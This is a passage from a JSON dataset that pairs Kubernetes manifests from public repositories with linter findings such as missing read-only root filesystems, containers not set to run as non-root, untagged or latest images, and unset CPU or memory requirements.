    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: akschallenge97396acr.azurecr.io/captureorder:cf1\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"captureorder\" does not have a read-only root file system"
  },
  {
    "id": "03943",
    "manifest_path": "data/manifests/the_stack_sample/sample_1754.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: akschallenge97396acr.azurecr.io/captureorder:cf1\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"captureorder\" is not set to runAsNonRoot"
  },
  {
    "id": "03944",
    "manifest_path": "data/manifests/the_stack_sample/sample_1766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: querier\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: loki\n    app.kubernetes.io/part-of: observatorium\n    app.kubernetes.io/version: 2.2.0\n  name: observatorium-xyz-loki-querier\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: querier\n      app.kubernetes.io/instance: observatorium-xyz\n      app.kubernetes.io/name: loki\n      app.kubernetes.io/part-of: observatorium\n      loki.grafana.com/gossip: 'true'\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: querier\n        app.kubernetes.io/instance: observatorium-xyz\n        app.kubernetes.io/name: loki\n        app.kubernetes.io/part-of: observatorium\n        loki.grafana.com/gossip: 'true'\n    spec:\n      containers:\n      - args:\n        - -target=querier\n        - -config.file=/etc/loki/config/config.yaml\n        - -limits.per-user-override-config=/etc/loki/config/overrides.yaml\n        - -log.level=error\n        - -s3.url=$(S3_URL)\n        - -s3.force-path-style=true\n        - -distributor.replication-factor=1\n        env:\n        - name: S3_URL\n          valueFrom:\n            secretKeyRef:\n              key: endpoint\n              name: loki-objectstorage\n        image: docker.io/grafana/loki:2.2.0\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /metrics\n            port: 3100\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-xyz-loki-querier\n        ports:\n        - containerPort: 3100\n          name: metrics\n        - containerPort: 9095\n          name: grpc\n        - containerPort: 7946\n          name: gossip-ring\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 3100\n            scheme: HTTP\n          initialDelaySeconds: 15\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - mountPath: /etc/loki/config/\n          name: config\n          readOnly: false\n        - mountPath: /data\n          name: storage\n          readOnly: false\n      volumes:\n      - configMap:\n          name: observatorium-xyz-loki\n        name: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"observatorium-xyz-loki-querier\" does not have a read-only root file system"
  },
  {
    "id": "03945",
    "manifest_path": "data/manifests/the_stack_sample/sample_1766.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: querier\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: loki\n    app.kubernetes.io/part-of: observatorium\n    app.kubernetes.io/version: 2.2.0\n  name: observatorium-xyz-loki-querier\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: querier\n      app.kubernetes.io/instance: observatorium-xyz\n      app.kubernetes.io/name: loki\n      app.kubernetes.io/part-of: observatorium\n      loki.grafana.com/gossip: 'true'\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: querier\n        app.kubernetes.io/instance: observatorium-xyz\n        app.kubernetes.io/name: loki\n        app.kubernetes.io/part-of: observatorium\n        loki.grafana.com/gossip: 'true'\n    spec:\n      containers:\n      - args:\n        - -target=querier\n        - -config.file=/etc/loki/config/config.yaml\n        - -limits.per-user-override-config=/etc/loki/config/overrides.yaml\n        - -log.level=error\n        - -s3.url=$(S3_URL)\n        - -s3.force-path-style=true\n        - -distributor.replication-factor=1\n        env:\n        - name: S3_URL\n          valueFrom:\n            secretKeyRef:\n              key: endpoint\n              name: loki-objectstorage\n        image: docker.io/grafana/loki:2.2.0\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /metrics\n            port: 3100\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-xyz-loki-querier\n        ports:\n        - containerPort: 3100\n          name: metrics\n        - containerPort: 9095\n          name: grpc\n        - containerPort: 7946\n          name: gossip-ring\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 3100\n            scheme: HTTP\n          initialDelaySeconds: 15\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - mountPath: /etc/loki/config/\n          name: config\n          readOnly: false\n        - mountPath: /data\n          name: storage\n          readOnly: false\n      volumes:\n      - configMap:\n          name: observatorium-xyz-loki\n        name: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"observatorium-xyz-loki-querier\" is not set to runAsNonRoot"
  },
  {
    "id": "03946",
    "manifest_path": "data/manifests/the_stack_sample/sample_1768.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failed-pod\nspec:\n  containers:\n  - name: motor\n    image: busybox\n    resources:\n      limits:\n        cpu: 100m\n        memory: 16Mi\n      requests:\n        cpu: 100m\n        memory: 16Mi\n    command:\n    - sh\n    - -c\n    args:\n    - echo \"This is failed phase\"; exit 1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"motor\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03947",
    "manifest_path": "data/manifests/the_stack_sample/sample_1768.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failed-pod\nspec:\n  containers:\n  - name: motor\n    image: busybox\n    resources:\n      limits:\n        cpu: 100m\n        memory: 16Mi\n      requests:\n        cpu: 100m\n        memory: 16Mi\n    command:\n    - sh\n    - -c\n    args:\n    - echo \"This is failed phase\"; exit 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"motor\" does not have a read-only root file system"
  },
  {
    "id": "03948",
    "manifest_path": "data/manifests/the_stack_sample/sample_1768.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failed-pod\nspec:\n  containers:\n  - name: motor\n    image: busybox\n    resources:\n      limits:\n        cpu: 100m\n        memory: 16Mi\n      requests:\n        cpu: 100m\n        memory: 16Mi\n    command:\n    - sh\n    - -c\n    args:\n    - echo \"This is failed phase\"; exit 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"motor\" is not set to runAsNonRoot"
  },
  {
    "id": "03949",
    "manifest_path": "data/manifests/the_stack_sample/sample_1771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: salesforce-connector\n  name: salesforce-connector\n  namespace: gfw\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: salesforce-connector\n  template:\n    metadata:\n      labels:\n        name: salesforce-connector\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: type\n                operator: In\n                values:\n                - gfw\n      containers:\n      - args:\n        - start\n        env:\n        - name: PORT\n          value: '9500'\n        - name: LOGGER_TYPE\n          value: console\n        - name: LOGGER_LEVEL\n          value: debug\n        - name: NODE_ENV\n          value: staging\n        - name: NODE_PATH\n          value: app/src\n        - name: MICROSERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: MICROSERVICE_TOKEN\n              name: mssecrets\n        - name: GATEWAY_URL\n          valueFrom:\n            secretKeyRef:\n              key: GATEWAY_URL\n              name: mssecrets\n        - name: FASTLY_ENABLED\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_ENABLED\n              name: mssecrets\n        - name: FASTLY_APIKEY\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_APIKEY\n              name: mssecrets\n              optional: true\n        - name: FASTLY_SERVICEID\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_SERVICEID\n              name: mssecrets\n              optional: true\n        - name: SALESFORCE_URL\n          valueFrom:\n            secretKeyRef:\n              key: SALESFORCE_URL\n              name: mssecrets\n        - name: SALESFORCE_USERNAME\n          valueFrom:\n            secretKeyRef:\n              key: SALESFORCE_USERNAME\n              name: mssecrets\n        - name: SALESFORCE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: SALESFORCE_PASSWORD\n              name: mssecrets\n        image: gfwdockerhub/salesforce-connector\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 9500\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: salesforce-connector\n        ports:\n        - containerPort: 9500\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 9500\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: 350m\n            memory: 256M\n      securityContext: {}\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"salesforce-connector\" is using an invalid container image, \"gfwdockerhub/salesforce-connector\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03950",
    "manifest_path": "data/manifests/the_stack_sample/sample_1771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: salesforce-connector\n  name: salesforce-connector\n  namespace: gfw\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: salesforce-connector\n  template:\n    metadata:\n      labels:\n        name: salesforce-connector\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: type\n                operator: In\n                values:\n                - gfw\n      containers:\n      - args:\n        - start\n        env:\n        - name: PORT\n          value: '9500'\n        - name: LOGGER_TYPE\n          value: console\n        - name: LOGGER_LEVEL\n          value: debug\n        - name: NODE_ENV\n          value: staging\n        - name: NODE_PATH\n          value: app/src\n        - name: MICROSERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: MICROSERVICE_TOKEN\n              name: mssecrets\n        - name: GATEWAY_URL\n          valueFrom:\n            secretKeyRef:\n              key: GATEWAY_URL\n              name: mssecrets\n        - name: FASTLY_ENABLED\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_ENABLED\n              name: mssecrets\n        - name: FASTLY_APIKEY\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_APIKEY\n              name: mssecrets\n              optional: true\n        - name: FASTLY_SERVICEID\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_SERVICEID\n              name: mssecrets\n              optional: true\n        - name: SALESFORCE_URL\n          valueFrom:\n            secretKeyRef:\n              key: SALESFORCE_URL\n              name: mssecrets\n        - name: SALESFORCE_USERNAME\n          valueFrom:\n            secretKeyRef:\n              key: SALESFORCE_USERNAME\n              name: mssecrets\n        - name: SALESFORCE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: SALESFORCE_PASSWORD\n              name: mssecrets\n        image: gfwdockerhub/salesforce-connector\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 9500\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: salesforce-connector\n        ports:\n        - containerPort: 9500\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 9500\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: 350m\n            memory: 256M\n      securityContext: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"salesforce-connector\" does not have a read-only root file system"
  },
  {
    "id": "03951",
    "manifest_path": "data/manifests/the_stack_sample/sample_1771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: salesforce-connector\n  name: salesforce-connector\n  namespace: gfw\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: salesforce-connector\n  template:\n    metadata:\n      labels:\n        name: salesforce-connector\n    spec:\n      affinity:\n        nodeAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n            nodeSelectorTerms:\n            - matchExpressions:\n              - key: type\n                operator: In\n                values:\n                - gfw\n      containers:\n      - args:\n        - start\n        env:\n        - name: PORT\n          value: '9500'\n        - name: LOGGER_TYPE\n          value: console\n        - name: LOGGER_LEVEL\n          value: debug\n        - name: NODE_ENV\n          value: staging\n        - name: NODE_PATH\n          value: app/src\n        - name: MICROSERVICE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: MICROSERVICE_TOKEN\n              name: mssecrets\n        - name: GATEWAY_URL\n          valueFrom:\n            secretKeyRef:\n              key: GATEWAY_URL\n              name: mssecrets\n        - name: FASTLY_ENABLED\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_ENABLED\n              name: mssecrets\n        - name: FASTLY_APIKEY\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_APIKEY\n              name: mssecrets\n              optional: true\n        - name: FASTLY_SERVICEID\n          valueFrom:\n            secretKeyRef:\n              key: FASTLY_SERVICEID\n              name: mssecrets\n              optional: true\n        - name: SALESFORCE_URL\n          valueFrom:\n            secretKeyRef:\n              key: SALESFORCE_URL\n              name: mssecrets\n        - name: SALESFORCE_USERNAME\n          valueFrom:\n            secretKeyRef:\n              key: SALESFORCE_USERNAME\n              name: mssecrets\n        - name: SALESFORCE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              key: SALESFORCE_PASSWORD\n              name: mssecrets\n        image: gfwdockerhub/salesforce-connector\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 9500\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: salesforce-connector\n        ports:\n        - containerPort: 9500\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthcheck\n            port: 9500\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: '1'\n            memory: 512M\n          requests:\n            cpu: 350m\n            memory: 256M\n      securityContext: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"salesforce-connector\" is not set to runAsNonRoot"
  },
  {
    "id": "03952",
    "manifest_path": "data/manifests/the_stack_sample/sample_1774.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: systemize-user-api\nspec:\n  selector:\n    matchLabels:\n      app: systemize-user-api\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: systemize-user-api\n    spec:\n      containers:\n      - name: systemize-user-api\n        image: systemize-user-api:latest\n        ports:\n        - containerPort: 3000\n        livenessProbe:\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          httpGet:\n            path: /health\n            port: 3000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"systemize-user-api\" is using an invalid container image, \"systemize-user-api:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03953",
    "manifest_path": "data/manifests/the_stack_sample/sample_1774.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: systemize-user-api\nspec:\n  selector:\n    matchLabels:\n      app: systemize-user-api\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: systemize-user-api\n    spec:\n      containers:\n      - name: systemize-user-api\n        image: systemize-user-api:latest\n        ports:\n        - containerPort: 3000\n        livenessProbe:\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          httpGet:\n            path: /health\n            port: 3000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"systemize-user-api\" does not have a read-only root file system"
  },
  {
    "id": "03954",
    "manifest_path": "data/manifests/the_stack_sample/sample_1774.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: systemize-user-api\nspec:\n  selector:\n    matchLabels:\n      app: systemize-user-api\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: systemize-user-api\n    spec:\n      containers:\n      - name: systemize-user-api\n        image: systemize-user-api:latest\n        ports:\n        - containerPort: 3000\n        livenessProbe:\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          httpGet:\n            path: /health\n            port: 3000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"systemize-user-api\" is not set to runAsNonRoot"
  },
  {
    "id": "03955",
    "manifest_path": "data/manifests/the_stack_sample/sample_1774.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: systemize-user-api\nspec:\n  selector:\n    matchLabels:\n      app: systemize-user-api\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: systemize-user-api\n    spec:\n      containers:\n      - name: systemize-user-api\n        image: systemize-user-api:latest\n        ports:\n        - containerPort: 3000\n        livenessProbe:\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          httpGet:\n            path: /health\n            port: 3000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"systemize-user-api\" has cpu request 0"
  },
  {
    "id": "03956",
    "manifest_path": "data/manifests/the_stack_sample/sample_1774.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: systemize-user-api\nspec:\n  selector:\n    matchLabels:\n      app: systemize-user-api\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: systemize-user-api\n    spec:\n      containers:\n      - name: systemize-user-api\n        image: systemize-user-api:latest\n        ports:\n        - containerPort: 3000\n        livenessProbe:\n          initialDelaySeconds: 20\n          periodSeconds: 5\n          httpGet:\n            path: /health\n            port: 3000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"systemize-user-api\" has memory limit 0"
  },
  {
    "id": "03957",
    "manifest_path": "data/manifests/the_stack_sample/sample_1781.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2476\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03958",
    "manifest_path": "data/manifests/the_stack_sample/sample_1781.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2476\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03959",
    "manifest_path": "data/manifests/the_stack_sample/sample_1781.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2476\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03960",
    "manifest_path": "data/manifests/the_stack_sample/sample_1781.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2476\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03961",
    "manifest_path": "data/manifests/the_stack_sample/sample_1781.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2476\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03962",
    "manifest_path": "data/manifests/the_stack_sample/sample_1782.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sensordeploy\n  labels:\n    app: sensorapp\nspec:\n  selector:\n    matchLabels:\n      app: sensorapp\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sensorapp\n    spec:\n      containers:\n      - name: sensorapp\n        image: 03021994/sensor:latest\n        command:\n        - python\n        - ./app/sensor-test.py\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        - containerPort: 8083\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 50m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sensorapp\" is using an invalid container image, \"03021994/sensor:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03963",
    "manifest_path": "data/manifests/the_stack_sample/sample_1782.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sensordeploy\n  labels:\n    app: sensorapp\nspec:\n  selector:\n    matchLabels:\n      app: sensorapp\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sensorapp\n    spec:\n      containers:\n      - name: sensorapp\n        image: 03021994/sensor:latest\n        command:\n        - python\n        - ./app/sensor-test.py\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        - containerPort: 8083\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 50m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sensorapp\" does not have a read-only root file system"
  },
  {
    "id": "03964",
    "manifest_path": "data/manifests/the_stack_sample/sample_1782.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sensordeploy\n  labels:\n    app: sensorapp\nspec:\n  selector:\n    matchLabels:\n      app: sensorapp\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: sensorapp\n    spec:\n      containers:\n      - name: sensorapp\n        image: 03021994/sensor:latest\n        command:\n        - python\n        - ./app/sensor-test.py\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 5000\n        - containerPort: 8083\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 50m\n          limits:\n            memory: 256Mi\n            cpu: 500m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sensorapp\" is not set to runAsNonRoot"
  },
  {
    "id": "03965",
    "manifest_path": "data/manifests/the_stack_sample/sample_1785.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: percona-xtradb-cluster-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: operator\n      app.kubernetes.io/instance: percona-xtradb-cluster-operator\n      app.kubernetes.io/name: percona-xtradb-cluster-operator\n      app.kubernetes.io/part-of: percona-xtradb-cluster-operator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: operator\n        app.kubernetes.io/instance: percona-xtradb-cluster-operator\n        app.kubernetes.io/name: percona-xtradb-cluster-operator\n        app.kubernetes.io/part-of: percona-xtradb-cluster-operator\n    spec:\n      containers:\n      - command:\n        - percona-xtradb-cluster-operator\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: percona-xtradb-cluster-operator\n        image: perconalab/percona-xtradb-cluster-operator:main\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /metrics\n            port: metrics\n            scheme: HTTP\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n        name: percona-xtradb-cluster-operator\n        ports:\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n      serviceAccountName: percona-xtradb-cluster-operator\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"percona-xtradb-cluster-operator\" does not have a read-only root file system"
  },
  {
    "id": "03966",
    "manifest_path": "data/manifests/the_stack_sample/sample_1785.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: percona-xtradb-cluster-operator\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: operator\n      app.kubernetes.io/instance: percona-xtradb-cluster-operator\n      app.kubernetes.io/name: percona-xtradb-cluster-operator\n      app.kubernetes.io/part-of: percona-xtradb-cluster-operator\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: operator\n        app.kubernetes.io/instance: percona-xtradb-cluster-operator\n        app.kubernetes.io/name: percona-xtradb-cluster-operator\n        app.kubernetes.io/part-of: percona-xtradb-cluster-operator\n    spec:\n      containers:\n      - command:\n        - percona-xtradb-cluster-operator\n        env:\n        - name: WATCH_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.name\n        - name: OPERATOR_NAME\n          value: percona-xtradb-cluster-operator\n        image: perconalab/percona-xtradb-cluster-operator:main\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /metrics\n            port: metrics\n            scheme: HTTP\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 20Mi\n        name: percona-xtradb-cluster-operator\n        ports:\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n      serviceAccountName: percona-xtradb-cluster-operator\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"percona-xtradb-cluster-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "03967",
    "manifest_path": "data/manifests/the_stack_sample/sample_1786.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      serviceAccountName: deck\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20201015-deb1bd1036\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --kubeconfig=/etc/kubeconfig/config\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          